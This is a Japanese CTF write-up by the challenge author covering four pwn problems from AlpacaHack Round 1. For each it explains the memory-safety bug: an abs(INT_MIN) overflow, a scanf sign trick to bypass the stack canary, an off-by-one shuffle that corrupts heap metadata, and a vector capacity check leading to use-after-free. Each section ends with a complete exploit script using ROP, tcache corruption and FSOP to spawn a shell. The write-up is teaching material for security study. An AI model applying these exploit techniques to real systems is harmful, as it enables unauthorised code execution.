---
来源: https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2024年8月
---

、90日以上更新していないブログに表示しています。


# はじめに

今月上旬に[AlpacaHack](https://alpacahack.com/)が正式にリリースされました。
AlpacaHackは[keymoon](https://x.com/kymn_)と[minaminao](https://x.com/vinami)が開発したCTFプラットフォームで、現在は[個人戦](https://d.hatena.ne.jp/keyword/%B8%C4%BF%CD%C0%EF)をメインにした定期CTFが開催されています。
また、過去大会の問題にも挑戦できるため、復習にも便利なサイトです。[\*1](#f-151339c0 "CTFは普通大会が終わると問題ファイルやサーバーが停止してしまい解き直しが難しいので、これはありがたい機能")
今回の問題も解き直すことができますので、参加を逃した方も挑戦してみてください。

[alpacahack.com](https://alpacahack.com/ctfs/round-1)

今回、光栄なことにこのAlpacaHackの記念すべき第一回の問題セットの作問を担当させていただきました。
ジャンルはPwnなので、これからCTFを始めるぞという人にはとっつきにくい問題だったかもしれませんが、面白いジャンルなのでwriteupを読んで勉強してみてください。
（次回は比較的入門の敷居が低い(?)Web回なので是非参加してみてください。）

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20240819/20240819035015.png)

記念すべき第一回の上位勢

* [はじめに](#はじめに)
* [echo (56 solves)](#echo-56-solves)
  + [問題概要](#問題概要)
  + [脆弱性](#脆弱性)
  + [攻撃](#攻撃)
* [hexecho (27 solves)](#hexecho-27-solves)
  + [問題概要](#問題概要-1)
  + [脆弱性](#脆弱性-1)
  + [攻撃](#攻撃-1)
* [deck (11 solves)](#deck-11-solves)
  + [問題概要](#問題概要-2)
  + [脆弱性](#脆弱性-2)
  + [攻撃](#攻撃-2)
    - [swapの制御](#swapの制御)
    - [アドレスリーク](#アドレスリーク)
    - [シェルの起動](#シェルの起動)
* [todo (5 solves)](#todo-5-solves)
  + [問題概要](#問題概要-3)
  + [脆弱性](#脆弱性-3)
  + [攻撃](#攻撃-3)
* [おわりに](#おわりに)

# echo (56 solves)

## 問題概要

指定した長さで入力したデータをそのまま出力し返すechoプログラムです。
入力データのバッファサイズは0x100で固定です。

```
void echo() {
  int size;
  char buf[BUF_SIZE];

  // Input size
  printf("Size: ");
  size = get_size();

  // Input data
  printf("Data: ");
  get_data(buf, size);

  // Show data
  printf("Received: %s\n", buf);
}
```

サイズの入力では、次のようにサイズがバッファサイズを超えないようにチェックが入っています。

```
int get_size() {
  // Input size
  int size = 0;
  scanf("%d%*c", &size);

  // Validate size
  if ((size = abs(size)) > BUF_SIZE) {
    puts("[-] Invalid size");
    exit(1);
  }

  return size;
}
```

scanfの入力では負数を受け付けますが、abs関数で絶対値が取られています。

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

もしサイズが負の数になると、`get_data`関数に負数が渡ることになります。しかし、この関数はunsigned型でサイズを取得します。

```
void get_data(char *buf, unsigned size) {
  unsigned i;
  char c;

  // Input data until newline
  for (i = 0; i < size; i++) {
    if (fread(&c, 1, 1, stdin) != 1) break;
    if (c == '\n') break;
    buf[i] = c;
  }
  buf[i] = '\0';
}
```

データ入力のfor文のカウンタもunsignedで比較されているため、負数がunsignedに暗黙的にキャストされ、バッファサイズを超えて入力できることがわかります。
しかし、サイズはabs関数で絶対値を取られているため、一見すると負数を渡すことはできません。何とかならないでしょうか？

有名な整数オーバーフローとして、`INT_MIN`に-1をかけても`INT_MIN`になるという問題があります。
int型は232の範囲から0を引いた奇数個のデータを負数と正数で分けているのですから、正と負のどちらかの表現できる数が多くなります。
2の補数表現では負数の方が1つ多いため、INT\_MINの絶対値に相当する値は表現できません。

abs関数の場合、絶対値が取れない値が入力として与えられた場合は未定義動作です。
サイズにINT\_MINにあたる-0x80000000を与えると、abs関数を通しても負の数のままとなり、サイズチェックを通過してしまいます。

## 攻撃

改行コードが送られるまでバッファサイズを超えて値を入力できるため、スタック[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC)が発生します。
[checksec](https://docs.pwntools.com/en/stable/commandline.html#pwn-checksec)コマンドで確認するとStack canaryがない[\*2](#f-912dbf2f "checksecは\"__stack_chk_fail\"関数がインポートされているかをもとにSSPを判断するので、false positive, false negativeの両方がありえることに注意してください")ので、単純にリターンアドレスを書き換えて任意のアドレスの[機械語](https://d.hatena.ne.jp/keyword/%B5%A1%B3%A3%B8%EC)を実行できます。

今回の問題では以下のwin関数が定義されており、呼び出すとフラグが表示されるようになっています。
また、checksecの出力からPIEが無効であるとわかるため、win関数のアドレスは固定です。

```
/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}
```

バッファの先頭からリターンアドレスの位置を[gdb](https://d.hatena.ne.jp/keyword/gdb)などで特定し、リターンアドレスを書き換えるデータを構築します。
以下のような[スクリプト](https://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8)でpayloadを送ると、win関数が呼ばれてフラグが出力されます。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 5000))

elf = ELF("./echo")
#sock = Process("./echo")
sock = Socket(HOST, PORT)

sock.sendlineafter("Size: ", -0x80000000)

payload  = b"A" * 0x118
payload += p64(elf.symbol("win"))
sock.sendlineafter("Data: ", payload)
sock.recvline()

print(sock.recvline().decode())

sock.close()
```

# hexecho (27 solves)

## 問題概要

echoのプログラムと似た構造ですが、今度は16進数でデータを送って、16進数でecho backされるプログラムとなっています。

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

さきほどのechoとは異なり、サイズチェックがないため、より単純な[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC)があります。
しかし、checksecで確認すると、Stack canaryがついていることがわかります。

ここで、16進数の入力を受け付ける`get_hex`関数に注目します。

```
void get_hex(char *buf, unsigned size) {
  for (unsigned i = 0; i < size; i++)
    scanf("%02hhx", buf + i);
}
```

この関数はscanfを使って16進数を受付ますが、scanfの戻り値を確認していません。
scanfはストリームを読み込み、指定された書式文字列に沿って入力をパースします。
このとき、書式文字列に対してパースできない入力が与えられると、scanfは失敗して変数に値を書き込みません。
したがって、16進数でない文字列を与えるとscanfは失敗し、stack canaryがある箇所を書き換えずにfor文を進めることができます。

しかし、scanfは解釈できない文字が与えられたとき、失敗すると同時にその文字をストリームに残します。
そのため、for文を進めても次以降のscanfもすべて失敗してしまいます。

scanfを失敗させつつ次以降のscanfを動作させるには、16進数として解釈できる文字列でscanfを失敗させる必要があります。
そのような方法として、符号文字のみを与える手法があります。
`+`や`-`を単体で入力すると、数値部分がないためscanfは失敗しますが、これらの文字は16進数として受け付けられるためストリームから消費されます。
これを利用すると、stack canaryを壊さないようにしつつリターンアドレスを書き換えられます。

## 攻撃

この問題はwin関数が用意されていないため、libcのアド[レスリー](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B9%A5%EA%A1%BC)クが必要となります。
スタック中のlibcのアドレスが残っている部分をstack canaryと同様に破壊しないことで、echo backの処理でlibcアドレスがリークできます。
アド[レスリー](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B9%A5%EA%A1%BC)ク後にexploitする必要がありますが、この際にリターンアドレスを`_start`や`main`関数に設定しておくことで、再度[バッファオーバーフロー](https://d.hatena.ne.jp/keyword/%A5%D0%A5%C3%A5%D5%A5%A1%A5%AA%A1%BC%A5%D0%A1%BC%A5%D5%A5%ED%A1%BC)を利用できます。

最後に、ROP(Return Oriented Programming)でsystem関数を呼び出し、シェルを起動します。
以下はexploitの例です。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 5000))

libc = ELF("./libc.so.6")
elf = ELF("./hexecho")
sock = Socket(HOST, PORT)

# Leak libc base
rop = flat([
    elf.symbol('_start')
], map=p64)
payload  = b"+ " * 0x118
payload += b" ".join([f"{c:02x}".encode() for c in rop])

sock.sendlineafter("Size: ", 0x120)
sock.sendlineafter("Data (hex): ", payload)
leak = bytes(map(lambda c: int(c, 16), sock.recvlineafter("Received: ").split()))

libc.base = u64(leak[0x98:0xa0]) - libc.symbol('_IO_2_1_stdout_')

# Win
rop = flat([
    next(libc.gadget('ret')),
    next(libc.gadget('pop rdi; ret')),
    next(libc.find('/bin/sh')),
    libc.symbol("system")
], map=p64)
payload  = b"+ " * 0x118
payload += b" ".join([f"{c:02x}".encode() for c in rop])

sock.sendlineafter("Size: ", 0x138)
sock.sendlineafter("Data (hex): ", payload)
sock.recvline()

sock.sendline("cat /flag*")
print(sock.recvline().decode())

sock.close()
```

# deck (11 solves)

## 問題概要

この問題のプログラムは、毎回シャッフルされるトランプの絵札と数字を当てるゲームになっています。両方当てたところで特に何も起きません。
ゲームの他に、シャッフル[アルゴリズム](https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の変更とプレイヤー名の変更機能が実装されています。

シャッフル[アルゴリズム](https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)はNaive, Fisher-Yates, Sattoloの3つ[\*3](#f-943754ca "調べてもほぼ100%がFisher-Yatesを紹介しており、Fisher-YatesとNaive以外のシャッフルアルゴリズム、この世に存在しなくないか？となった")から選べます。
ゲームは以下のような構造体で管理されており、シャッフル[アルゴリズム](https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)は関数ポインタとなっています。

```
typedef unsigned short card_t;
typedef struct _game_t {
  void (*shuffle)(card_t*);
  card_t *deck;
  char *name;
} game_t;
```

deckは16-bit符号なし整数の配列で、nameはプレイヤー名です。各種データは以下のように[malloc](https://d.hatena.ne.jp/keyword/malloc)などで確保されています。

```
  if (!(deck = (card_t*)malloc(sizeof(card_t) * DECK_SIZE)))
    goto err;
  if (!(name = strdup("Human")))
    goto err;
  if (!(game = (game_t*)malloc(sizeof(game_t))))
    goto err;
```

deckの各要素はカードで、上位8ビットがトランプの絵柄（0〜3）で、下位8ビットが数字（0〜12）を取ります。

```
#define MAKE_CARD(suit, rank) ((((suit)) << 8) | (rank))
```

ゲームを開始すると選択したシャッフル[アルゴリズム](https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)の関数ポインタが呼ばれ、deckがシャッフルされます。また、このときプレイヤー名が表示されます。

```
void game_play(game_t *game) {
  printf("Challenger: %s\n", game->name);
  game->shuffle(game->deck);
```

プレイヤー名は0x1000文字までの長さで自由に変更でき、古い名前の領域は適切にfreeで解放されます。

```
      case 3: {
        char *name;
        size_t len = getval("Length: ");

        if (len > 0x1000) {
          puts("[-] Invalid length");
          break;
        }

        if (!(name = (char*)malloc(len + 1))) {
          puts("[-] Cannot allocate memory");
          break;
        }

        getstr("Name: ", name, len);

        free(game->name);
        game->name = name;
        break;
      }
```

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

よく見るとFisher-Yates Shuffleの実装がバグっています。

```
void shuffle_knuth(card_t *deck) {
  size_t i, j;

  for (i = DECK_SIZE; i > 0; i--) {
    j = rand() % (i + 1);
    swap_cards(deck, i, j);
  }
}
```

剰余がi+1になっているので、for文の最初の[イテレーション](https://d.hatena.ne.jp/keyword/%A5%A4%A5%C6%A5%EC%A1%BC%A5%B7%A5%E7%A5%F3)では変数`j`は`[0, DECK_SIZE]`の範囲の数を取りえます。
もし`j`がDECK\_SIZEになってしまうと、deckの範囲を1だけ超えた場所とカードの数値がswapされてしまいます。

## 攻撃

初期状態のヒープは次のようになっています。

```
gef> x/32xg 0x0000000000405290
0x405290:       0x0000000000000000      0x0000000000000071
0x4052a0:       0x0003000200010000      0x0007000600050004 <-- deck
0x4052b0:       0x000b000a00090008      0x010201010100000c
0x4052c0:       0x0106010501040103      0x010a010901080107
0x4052d0:       0x02010200010c010b      0x0205020402030202
0x4052e0:       0x0209020802070206      0x0300020c020b020a
0x4052f0:       0x0304030303020301      0x0308030703060305
0x405300:       0x030c030b030a0309      0x0000000000000021
0x405310:       0x0000006e616d7548      0x0000000000000000 <-- "Human"
0x405320:       0x0000000000000000      0x0000000000000021
0x405330:       0x000000000040143a      0x00000000004052a0 <-- game
0x405340:       0x0000000000405310      0x0000000000020cc1
0x405350:       0x0000000000000000      0x0000000000000000
0x405360:       0x0000000000000000      0x0000000000000000
0x405370:       0x0000000000000000      0x0000000000000000
0x405380:       0x0000000000000000      0x0000000000000000
```

deckのサイズは16-bit \* (13\*4) = 0x68なので、先述の範囲外参照が発生すると、deckの先頭から0x68バイト先にある2バイトがカードのデータとswapされます。

この場所には、[malloc](https://d.hatena.ne.jp/keyword/malloc)で確保されたnameの[メタデータ](https://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%C7%A1%BC%A5%BF)である0x21があります。
この[メタデータ](https://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%C7%A1%BC%A5%BF)の下4ビットを除く値はチャンクサイズを表し、この例ではチャンクが0x20バイト（[メタデータ](https://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%C7%A1%BC%A5%BF)を除くデータ本体が最大0x18バイト）であることを示します。

この値がトランプの値と入れ替わることで、nameの領域のサイズ情報が狂います。
例えば0x201（♥の2）とswapされた場合、nameのサイズは0x200となってしまいます。

名前更新でfree関数が呼ばれると、nameの領域はtcacheと呼ばれるサイズごとの片方向リストに繋がってキャッシュされます。
サイズ情報が破壊されたnameは先程の例だとサイズ0x200のリストに繋がることになります。
すると、次にサイズ0x200（0x1e9〜0x1f8）の[malloc](https://d.hatena.ne.jp/keyword/malloc)が呼ばれたとき、tcacheからもとのnameがあったポインタが返ります。
したがって、本来0x20のサイズのチャンクに0x200バイト程度のデータが書き込めるため、ヒープバッファーオーバーフローが発生します。

初期状態でnameがあった場所でオーバーフローが発生すると、game構造体を破壊できてしまうため、関数ポインタやdeckのポインタなどを自由に操作できます。

### swapの制御

52枚のカードのうちサイズ情報として適切なものは0x101（♦2）, 0x201（♥2）, 0x301（♣2）の3つのみなので、これらのうちいずれかとswapされる必要があります。
乱数は現在時刻をシードとして`srand`で初期化されているので再現可能です。

したがって、手元でカードのシャッフルをシミュレートして、上述の条件を満たす状態になるまでシャッフルを繰り返せばサイズ情報を意図的に良い値で破壊できます。

### アド[レスリー](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B9%A5%EA%A1%BC)ク

ヒープバッファーオーバーフローが発生したら、libcのアドレスをリークする必要があります。
ゲームが開始したときのコードを再度確認すると、次の2行のうちいずれかがアド[レスリー](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B9%A5%EA%A1%BC)クに使えそうです。

```
  printf("Challenger: %s\n", game->name);
  game->shuffle(game->deck);
```

まずprintfを使ったリークを考えます。
`game->name`が自由に破壊可能なので、ここをlibcのアドレスを持つGOT(Global Offset Table)などに向けるとアド[レスリー](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B9%A5%EA%A1%BC)クができます。
しかし、次に名前を変更しようとしたときにこのアドレスをfreeしようとしてクラッシュするため、この方針は使えません。

次に、`game->shuffle`および`game->deck`を破壊することを考えます。
`game->shuffle`をputs関数に向け、`game->deck`をGOTなどに向けると、アドレスがリークできることがわかります。
nameと違ってdeckは破壊しても問題ないので、この方針でアドレスがリークできます。

### シェルの起動

再度ヒープオーバーフローを発生させるため、今あるサイズ0x200のチャンクを一度freeし、再度確保します。
`game->shuffle`を`system`に、`game->deck`を`/bin/sh`のポインタにそれぞれ向けると、次にゲームを開始した際にシェルが起動します。

最終的なexploitは以下のようになります。

```
from ptrlib import *
import ctypes
import os

def play_game(suit, num):
    sock.sendlineafter("> ", 1)
    name = sock.recvlineafter("Challenger: ")
    sock.sendlineafter(": ", suit)
    sock.sendlineafter(": ", num)
    return name

def change_algo(algo):
    sock.sendlineafter("> ", 2)
    sock.sendlineafter(": ", algo)

def change_name(size, name):
    sock.sendlineafter("> ", 3)
    sock.sendlineafter(": ", size)
    sock.sendlineafter(": ", name)


HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 5000))

cdll = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./deck")

#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#sock = Process("./deck")

libc = ELF("./libc.so.6")
sock = Socket(HOST, PORT)

cdll.srand(cdll.time(0))

deck = [((i//13)<<8)|(i%13) for i in range(13*4)] + [0x21]

# 1. Corrupt chunk size
change_algo(2) # Fisher-Yates
while True:
    print(".", end="", flush=True)
    for i in range(13*4, 0, -1):
        j = cdll.rand() % (i + 1)
        deck[i], deck[j] = deck[j], deck[i]
    play_game(0, 0)

    if deck[13*4] in [0x101, 0x201, 0x301]: break

logger.info("Successfully created fake chunk!")

# 2. Free fake chunk
change_name(0x20, b"A"*0x10)

# 3. Overwrite game struct
if deck[13*4] == 0x101: size = 0xf0
elif deck[13*4] == 0x201: size = 0x1f0
elif deck[13*4] == 0x301: size = 0x2f0

payload  = b"A"*0x18 + p64(0x21)
payload += p64(elf.plt('puts'))
payload += p64(0x404140)[:-1] # stdout
change_name(size, payload)

# 4. Leak libc base
sock.sendlineafter("> ", 1)
name = sock.recvlineafter("Challenger: ")
leak = sock.recvline() # shuffle(deck) is equivalent to puts(stdout)
libc.base = u64(leak) - libc.symbol('_IO_2_1_stdout_')
sock.sendlineafter(": ", 0)
sock.sendlineafter(": ", 0)

# 5. Win
change_name(0x20, b"A"*0x10)
payload  = b"A"*0x18 + p64(0x21)
payload += p64(libc.symbol('system'))
payload += p64(next(libc.find("/bin/sh")))[:-1]
change_name(size, payload)
sock.sendlineafter("> ", 1)

sock.recvline()
sock.sendline("cat /flag*")
print(sock.recvline().decode())

sock.close()
```

# todo (5 solves)

## 問題概要

最後はメモを管理できる[C++](https://d.hatena.ne.jp/keyword/C%2B%2B)のプログラムです。

TODOリストは以下のようにstringの[vector](https://d.hatena.ne.jp/keyword/vector)で管理されています。

```
  std::vector<std::string> todo_list;
```

このベクタに対して、文字列をpush, show, edit, deleteできます。

## [脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)

show, edit, およびdeleteではベクタのインデックスを次のようにチェックしています。

```
if (index >= todo_list.capacity()) {
  std::cout << "[-] Invalid index" << std::endl;
  break;
}
```

ここで、[C++](https://d.hatena.ne.jp/keyword/C%2B%2B)の[vector](https://d.hatena.ne.jp/keyword/vector)における[capacityメソッド](https://cplusplus.com/reference/vector/vector/capacity/)は、ヒープ上でこの[vector](https://d.hatena.ne.jp/keyword/vector)が再確保なしで追加できる要[素数](https://d.hatena.ne.jp/keyword/%C1%C7%BF%F4)を表しており、現在の要[素数](https://d.hatena.ne.jp/keyword/%C1%C7%BF%F4)を返すのはsizeメソッドです。

libstdc++の[STL](https://d.hatena.ne.jp/keyword/STL)実装では、[vector](https://d.hatena.ne.jp/keyword/vector)はpushなどでサイズが足りないときに容量を倍にして再確保します。
一方で、eraseなどで要素を消しても、[shrink\_to\_fitメソッド](https://cplusplus.com/reference/vector/vector/shrink_to_fit/)を明示的に呼ばない限り再確保は発生しません。
つまり、このメソッドを呼ばない限り[vector](https://d.hatena.ne.jp/keyword/vector)の容量が小さくなることはありません。

したがって、delete機能で要[素数](https://d.hatena.ne.jp/keyword/%C1%C7%BF%F4)を減らしても容量は変わらないため、以降のshow, edit, deleteで範囲外参照が起こります。
特に、stringは長い文字列をヒープに確保するため、その場合はUse-after-Freeが起こります。

## 攻撃

アド[レスリー](https://d.hatena.ne.jp/keyword/%A5%EC%A5%B9%A5%EA%A1%BC)クは比較的簡単です。
巨大なサイズのチャンクをfreeするとunsorted binと呼ばれるlibcが管理する双方向リストにリンクされるため、fd, bkのアドレスがチャンク先頭に記録されます。
リストの先頭はlibcのアドレス（main\_arena内）なので、Use-after-Freeでこれをshowすることでlibcのベースアドレスが求まります。

容量は再確保のたびに2倍になるため、1,2,4,8,...と増えていきます。
したがって、3つ目の要素を追加した際の容量は4になり、存在しない4つ目の要素を参照できるようになります。

この再確保において、まだ使われていないインデクスの領域は初期化されないため、ヒープ上に残っていたデータがそのままベクタ中に残ります。
したがって、あらかじめ適切なサイズ（容量4の`vector<string>`相当のサイズ）の文字列で偽のベクタ構造を作ってfreeしておくと、範囲外参照で4つ目を要素を参照するときに偽のstringを参照してしまいます。

具体的には、`std::string`は次のような0x20バイトの構造をしています。

```
00h: データポインタ
08h: サイズ
10h: 容量
18h: 未使用（サイズが0x10未満のときのみ利用）
```

`std::vector`は次のような0x18バイトの構造です。

```
00h: ベクタの先頭ポインタ
08h: ベクタのサイズ限界のポインタ
10h: ベクタの容量限界のポインタ
```

`std::vector<std::string>`の場合、ベクタの先頭ポインタから0x20バイトごとに詰めて`std::string`が入っていることになります。
これらの構造を適切にヒープ上に配置し、[脆弱性](https://d.hatena.ne.jp/keyword/%C0%C8%BC%E5%C0%AD)を利用してそれを参照することで、偽の`std::string`を利用できます。

libstdc++における[STL](https://d.hatena.ne.jp/keyword/STL)の各種データ構造の実装については昔[記事を書いた](https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732)ので、そちらも参考にしてください。

`std::string`は、容量を超えない限りcinやgetlineで再確保することなくデータを書き込めるため、任意のアドレスにデータを書き込めます。
任意アドレス書き込みができたら、[stderrなどのFILE構造体などを破壊して](https://blog.kylebot.net/2022/10/22/angry-FSROP/)シェルを起動できます。
（AARも作れるため、environなどからスタックのアドレスを取得してROPに持ち込むことも可能です。）

最終的なexploitは以下のようになります。

```
from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 5000))

def add(todo):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", todo)

def show(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", index)
    return sock.recvlineafter(": ")

def edit(index, todo):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", index)
    sock.sendlineafter(": ", todo)

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter(": ", index)

#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#sock = Process("./chall", cwd="../distfiles")
libc = ELF("../distfiles/libc.so.6")
sock = Socket(HOST, PORT)

# Leak heap (not necessary though)
add("A"*0x420)
add("B"*0x10)
delete(1)
delete(0)
addr_heap = (u64(show(1)[:8]) << 12)
logger.info("heap = " + hex(addr_heap))

# Leak libc
libc.base = u64(show(0)[:8]) - libc.main_arena() - 0x60

# Prepare fake vector
payload  = b"A"*0x40
payload += p64(0xdeadbeef) + p64(0) + p64(0) + p64(0)
payload += p64(libc.symbol('_IO_2_1_stderr_')) + p64(0x100) + p64(0x100) + p64(0)
add(payload)
delete(0)

# Expand vector
add(b"A")
add(b"B")
add(b"C")

# AAW (FSOP for C++)
payload  = p32(0xfbad0101) + b";sh\0" # fp->_flags & _IO_UNBUFFERED == 0)
payload += b"\x00" * (0x58 - len(payload))
payload += p64(libc.symbol("system")) # vtable->iowalloc
payload += b"\x00" * (0x88 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xa0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xc0 - len(payload))
payload += p32(1) # fp->_mode != 0
payload += b"\x00" * (0xd0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # (1) _wide_data->vtable
payload += p64(libc.symbol("_IO_wfile_jumps") + 0x18 - 0x60) # _IO_wfile_jumps + delta
edit(3, payload)

# Win
sock.sendlineafter("> ", "5")

sock.sendline("cat /flag*")
sock.recvline() # skip "not found"
print(sock.recvline().decode())

sock.close()
```

# おわりに

一般pwnerが6時間で全完できるかどうか、みたいな問題セットを作るのが難しかったです。
結果的にsolve数の分布は難易度が上がるにつれてきれいに減衰していったので安心しました。[\*4](#f-5d3a2038 "後ろの方は難易度というより時間が足りなかった人が多そう")

次は[Web回](https://alpacahack.com/ctfs/round-2)が9月1日にあるそうなので、ぜひ参加したいですね。

[\*1](#fn-151339c0):CTFは普通大会が終わると問題ファイルやサーバーが停止してしまい解き直しが難しいので、これはありがたい機能

[\*2](#fn-912dbf2f):checksecは"\_\_stack\_chk\_fail"関数がインポートされているかをもとに[SSP](https://d.hatena.ne.jp/keyword/SSP)を判断するので、false positive, false negativeの両方がありえることに注意してください

[\*3](#fn-943754ca):調べてもほぼ100%がFisher-Yatesを紹介しており、Fisher-YatesとNaive以外のシャッフル[アルゴリズム](https://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0)、この世に存在しなくないか？となった

[\*4](#fn-5d3a2038):後ろの方は難易度というより時間が足りなかった人が多そう


[« 
AlpacaHack Round 6 (Pwn)のWriteup](https://ptr-yudai.hatenablog.com/entry/2024/11/03/233033)

[Google CTF 2024 Quals Writeups
 »](https://ptr-yudai.hatenablog.com/entry/2024/07/09/115940)